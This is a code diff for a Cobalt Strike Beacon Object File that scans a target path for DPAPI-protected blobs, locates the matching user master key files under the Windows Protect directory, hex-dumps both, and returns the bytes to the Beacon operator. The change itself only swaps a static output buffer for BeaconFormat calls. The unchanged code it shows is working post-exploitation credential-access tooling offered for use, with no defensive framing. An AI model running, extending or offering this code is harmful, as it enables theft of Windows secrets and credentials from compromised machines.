@@ -37,52 +37,28 @@ DECLSPEC_IMPORT int    WINAPI MSVCRT$_vsnprintf(char*, size_t, const char*, va_l
 #define strcmp    MSVCRT$strcmp
 #define snprintf  MSVCRT$_snprintf
 
-// for output buffering - i don't really like this, but it'll work for now
-char global_out[24576]; // 24KB static buffer
-int  global_ptr = 0;
-
-// Global flag to control output
+// Global output object
+formatp outputbuffer;
 BOOL g_DUMP_RAW = FALSE;
 
-void buffered_printf(const char* fmt, ...) {
-    va_list args;
-    va_start(args, fmt);
-    // write into the buffer at the current pointer location
-    int wrote = MSVCRT$_vsnprintf(global_out + global_ptr, sizeof(global_out) - global_ptr, fmt, args);
-    if (wrote > 0) {
-        global_ptr += wrote;
-    }
-    va_end(args);
-}
-
-// macro to redefine printf
-#define printf(...) buffered_printf(__VA_ARGS__)
-
-//////////////////////////////////////
-// helper functions
-//////////////////////////////////////
 void dumpFileBytes(char* filePath) {
-    // If the global flag is off, skip the hex dump
-    if (!g_DUMP_RAW) {
-        return;
-    }    
+    if (!g_DUMP_RAW) return;
 
     HANDLE hFile = KERNEL32$CreateFileA(filePath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
     if (hFile == INVALID_HANDLE_VALUE) {
-        printf("[-] Could not open for dumping: %s\n", filePath);
+        BeaconFormatPrintf(&outputbuffer, "[-] Could not open for dumping: %s\n", filePath);
         return;
     }
 
     char buffer[1024];
     DWORD bytesRead = 0;
     if (KERNEL32$ReadFile(hFile, buffer, sizeof(buffer), &bytesRead, NULL)) {
-        printf("[*] Raw bytes for %s (%d bytes):\n", filePath, bytesRead);
-        
+        BeaconFormatPrintf(&outputbuffer, "[*] Raw bytes for %s (%d bytes):\n", filePath, bytesRead);
         for (DWORD i = 0; i < bytesRead; i++) {
-            printf("\\x%02X", (unsigned char)buffer[i]);
-            if ((i + 1) % 32 == 0) printf("\n");
+            BeaconFormatPrintf(&outputbuffer, "\\x%02X", (unsigned char)buffer[i]);
+            if ((i + 1) % 32 == 0) BeaconFormatPrintf(&outputbuffer, "\n");
         }
-        printf("\n[+] End of Dump\n");
+        BeaconFormatPrintf(&outputbuffer, "\n[+] End of Dump\n");
     }
     KERNEL32$CloseHandle(hFile);
 }
@@ -126,7 +102,7 @@ void parseFile(char* filePath) {
     int idx = IndexOfBytes(buffer, (int)bytesRead, magic, sizeof(magic));
 
     if (idx >= 0) {
-        printf("[+] Found DPAPI blob: %s\n", filePath);
+        BeaconFormatPrintf(&outputbuffer, "[+] Found DPAPI blob: %s\n", filePath);
         dumpFileBytes(filePath);
 
         char mkGuidRaw[16];
@@ -159,8 +135,8 @@ void parseFile(char* filePath) {
                         snprintf(mkPath, MAX_PATH, "%s\\AppData\\Roaming\\Microsoft\\Protect\\%s\\%s", 
                                  szProfilePath, szSid, guidStr);
                         
-                        printf("[*] Master Key GUID: %s\n", guidStr);
-                        //printf("[*] Attempting to dump Master Key: %s\n", mkPath);
+                        BeaconFormatPrintf(&outputbuffer, "[*] Master Key GUID: %s\n", guidStr);
+                        //BeaconFormatPrintf(&outputbuffer, "[*] Attempting to dump Master Key: %s\n", mkPath);
                         dumpFileBytes(mkPath);
                     }
                     KERNEL32$LocalFree(szSid);
@@ -175,23 +151,20 @@ void parseFile(char* filePath) {
 void go(char* args, int len) {
     datap parser;
     char* searchMask = NULL;
+    int searchMaskLen = 0;
     int dumpFlag = 0;
-    
-    // reset the global buffer - gross
-    global_ptr = 0;
-    for(int i=0; i<sizeof(global_out); i++) global_out[i] = 0;
-
-    int pathLen = 0;
 
     BeaconDataParse(&parser, args, len);
-    searchMask = BeaconDataExtract(&parser, &pathLen);
-    // Extract the integer flag from bof_pack
-    dumpFlag = BeaconDataInt(&parser);    
+    searchMask = BeaconDataExtract(&parser, &searchMaskLen);
+    dumpFlag = BeaconDataInt(&parser);
     g_DUMP_RAW = (dumpFlag == 1) ? TRUE : FALSE;
-    
+
+    // initialize with 16KB - might be able to go lower here?
+    BeaconFormatAlloc(&outputbuffer, 16384);
+
     if (searchMask == NULL) {
-        printf("[-] No search path provided.\n");
-    } else {        
+        BeaconFormatPrintf(&outputbuffer, "[-] No search path provided.\n");
+    } else {
         // strip the * to get the base directory for path concatenation
         char baseDir[MAX_PATH];
         snprintf(baseDir, MAX_PATH, "%s", searchMask);
@@ -217,8 +190,11 @@ void go(char* args, int len) {
         }
     }
 
-    printf("[+] BOF Finished.\n");
+    BeaconFormatPrintf(&outputbuffer, "[+] BOF Finished.\n");
 
-    // Send the entire collected buffer back as a single packet
-    BeaconPrintf(CALLBACK_OUTPUT, "%s", global_out);
+    // 2. PRINT: Send the final result
+    BeaconPrintf(CALLBACK_OUTPUT, "%s", BeaconFormatToString(&outputbuffer, NULL));
+
+    // 3. FREE: Clean up the heap
+    BeaconFormatFree(&outputbuffer);
 }
